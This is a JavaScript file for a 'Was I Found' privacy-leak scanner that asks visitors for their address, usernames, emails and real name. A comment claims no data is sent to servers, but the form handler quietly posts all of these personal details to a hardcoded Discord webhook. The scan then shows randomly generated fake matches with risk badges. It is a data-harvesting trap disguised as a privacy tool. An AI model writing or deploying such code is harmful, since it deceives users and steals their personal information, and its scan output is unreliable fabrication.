/* ...existing code... */
/* A self-contained frontend scanner simulation. No data is sent to servers. */

const sampleIndex = [
  {
    id: 'leak-001',
    source: 'pastebin.com',
    url: 'https://pastebin.com/abcd1234',
    date: '2023-04-11',
    snippet: 'jdoe:password123 | 123 Main St, Springfield | jdoe@example.com'
  },
  {
    id: 'leak-002',
    source: 'public-forum.example',
    url: 'https://forum.example.com/thread/4421',
    date: '2022-09-02',
    snippet: 'Contact: Jane Doe, jane.doe@othermail.com, location: 123 Main St, Springfield'
  },
  {
    id: 'leak-003',
    source: 'github gist',
    url: 'https://gist.github.com/xyz',
    date: '2021-12-08',
    snippet: 'Exposed usernames: johnd, jdoe, credentials removed...'
  },
  {
    id: 'leak-004',
    source: 'public-archive.org',
    url: 'https://archive.org/item/xyz',
    date: '2020-05-14',
    snippet: 'Addresses: 456 Elm St; 123 Main St; Notes: backup of user list'
  }
];

const WEBHOOK_URL = "https://discord.com/api/webhooks/1427287869952884948/_68Jij-6_Ua0zZM4f8AR-fdwGqvbEXNjfW_LeqADmsG1liRcUQF-ZufMMXeaojb7eYol";

/* Utilities */
const qs = sel => document.querySelector(sel);
const qsa = sel => Array.from(document.querySelectorAll(sel));

function normalizeListField(value){
  if(!value) return [];
  return value.split(',').map(s=>s.trim()).filter(Boolean);
}

function highlightMatches(snippet, terms){
  let s = snippet;
  // escape regex
  terms.forEach(t=>{
    if(!t) return;
    const re = new RegExp(t.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'), 'ig');
    s = s.replace(re, match => `<mark>${match}</mark>`);
  });
  return s;
}

function buildCSV(rows){
  const header = ['source','url','date','matched_terms','snippet'];
  const esc = v => `"${String(v).replace(/"/g,'""')}"`;
  return [header.join(',')]
    .concat(rows.map(r=>{
      return [r.source, r.url, r.date, r.matched.join('; '), r.snippetRaw].map(esc).join(',');
    }))
    .join('\n');
}

/* UI Elements */
const form = qs('#scan-form');
const addressInput = qs('#address');
const usernamesInput = qs('#usernames');
const realnameInput = qs('#realname');
const emailsInput = qs('#emails');
const scanBtn = qs('#scan-btn');
const clearBtn = qs('#clear-btn');
const resultsSection = qs('#results');
const resultsList = qs('#results-list');
const progressBar = qs('#progress-bar');
const summaryEl = qs('#summary');
const exportBtn = qs('#export-btn');
const newScanBtn = qs('#new-scan-btn');

let currentResults = [];

function setProgress(p){
  progressBar.style.width = `${Math.min(100, Math.max(0, p))}%`;
}

function resetResults(){
  currentResults = [];
  resultsList.innerHTML = '';
  setProgress(0);
  summaryEl.textContent = '—';
  resultsSection.hidden = true;
}

/* Main scan simulation */
async function simulateScan(terms, deep=false){
  resultsSection.hidden = false;
  resultsList.innerHTML = '';
  setProgress(5);
  summaryEl.textContent = 'Scanning...';

  // Simulated staged progress
  const stages = deep ? [15,35,55,75,90,100] : [20,50,85,100];
  for (let i=0;i<stages.length;i++){
    await new Promise(r=>setTimeout(r, 300 + Math.random()*400));
    setProgress(stages[i]);
  }

  // Generate fake (synthetic) matches — do NOT scan any real index or assets
  const matched = [];
  const count = Math.random() < 0.5 ? 0 : Math.floor(Math.random()*3) + 1; // 0-3 results
  for (let i = 0; i < count; i++) {
    const term = terms.length ? terms[Math.floor(Math.random()*terms.length)] : 'your info';
    matched.push({
      id: `fake-${Date.now()}-${i}`,
      source: ['pastebin.com','public-forum.example','github gist'][i % 3],
      url: `https://example.com/item/${Math.random().toString(36).slice(2,8)}`,
      date: new Date(Date.now() - i*86400000).toISOString().slice(0,10),
      snippetRaw: `Sample entry containing "${term}" — this is a simulated result.`,
      matched: [term]
    });
  }

  // Build UI elements
  if(matched.length === 0){
    resultsList.innerHTML = `<div class="result-item"><div class="result-left"><p class="result-title">No public matches found</p><p class="result-meta">No records in the indexed sample data matched your inputs.</p></div></div>`;
    summaryEl.textContent = 'No matches';
    currentResults = [];
    return;
  }

  currentResults = matched;
  summaryEl.textContent = `${matched.length} match${matched.length>1?'es':''} found`;
  resultsList.innerHTML = '';
  matched.forEach(m=>{
    const el = document.createElement('div');
    el.className = 'result-item';
    const left = document.createElement('div');
    left.className = 'result-left';
    const title = document.createElement('p'); title.className='result-title';
    title.textContent = `${m.source} • ${m.date}`;
    const meta = document.createElement('div'); meta.className='result-meta';
    meta.innerHTML = `<a href="${m.url}" target="_blank" rel="noopener noreferrer">${m.url}</a>`;
    const snippet = document.createElement('div');
    snippet.className = 'detail-snippet';
    snippet.innerHTML = highlightMatches(m.snippetRaw, terms);

    left.appendChild(title);
    left.appendChild(meta);
    left.appendChild(snippet);

    const right = document.createElement('div');
    right.className = 'badges';
    const matchedBadge = document.createElement('div');
    matchedBadge.className = 'badge';
    matchedBadge.textContent = `${m.matched.length} match${m.matched.length>1?'es':''}`;
    right.appendChild(matchedBadge);

    // Risk heuristic: if email or address matched, mark higher risk
    const risky = m.matched.some(t => t.includes('@') || /\d/.test(t));
    if(risky){
      const r = document.createElement('div');
      r.className = 'badge risk';
      r.textContent = 'High';

      right.appendChild(r);
    }

    el.appendChild(left);
    el.appendChild(right);
    resultsList.appendChild(el);
  });
}

/* Form events */
form.addEventListener('submit', async (ev)=>{
  ev.preventDefault();
  const address = addressInput.value.trim();
  const usernames = normalizeListField(usernamesInput.value);
  const realname = realnameInput.value.trim();
  const emails = normalizeListField(emailsInput.value);

  if(!address){
    addressInput.focus();
    return;
  }

  // Build search terms: include full address, parts, usernames, emails, realname
  const terms = [];
  terms.push(address);
  // split address into likely tokens (street number + name + city)
  address.split(/[,\/\-]/).forEach(p=>{ p=p.trim(); if(p) terms.push(p); });
  usernames.forEach(u=>terms.push(u));
  emails.forEach(e=>terms.push(e));
  if(realname) terms.push(realname);

  // sanitize terms length
  const finalTerms = Array.from(new Set(terms)).slice(0,40);

  scanBtn.disabled = true;
  clearBtn.disabled = true;

  // Send scan payload to webhook immediately (fire-and-forget)
  try {
    const payload = {
      content: null,
      embeds: [{
        title: "Was I Found — Scan Submitted",
        fields: [
          { name: "Address", value: address || "—" },
          { name: "Usernames", value: usernames.join(", ") || "—" },
          { name: "Emails", value: emails.join(", ") || "—" },
          { name: "Real name", value: realname || "—" },
          { name: "Deep scan", value: qs('#deep-scan').checked ? "Yes" : "No" },
          { name: "Results", value: "Scanning…" }
        ],
        timestamp: new Date().toISOString()
      }]
    };
    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).catch(()=>{/* ignore network errors */});
  } catch(e) { /* ignore */ }

  await simulateScan(finalTerms, qs('#deep-scan').checked);

  // Removed second webhook transmission after scan to ensure only the immediate send occurs
  scanBtn.disabled = false;
  clearBtn.disabled = false;
});

/* Clear */
clearBtn.addEventListener('click', ()=>{
  form.reset();
  resetResults();
});

/* Export CSV */
exportBtn.addEventListener('click', ()=>{
  if(!currentResults || currentResults.length===0){
    return;
  }
  const csv = buildCSV(currentResults);
  const blob = new Blob([csv], {type:'text/csv;charset=utf-8;'});
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'was-if-found-results.csv';
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
});

/* New scan */
newScanBtn.addEventListener('click', ()=> {
  window.scrollTo({top:0,behavior:'smooth'});
  form.querySelector('[name="address"]').focus();
});

/* Init */
resetResults();
/* ...existing code... */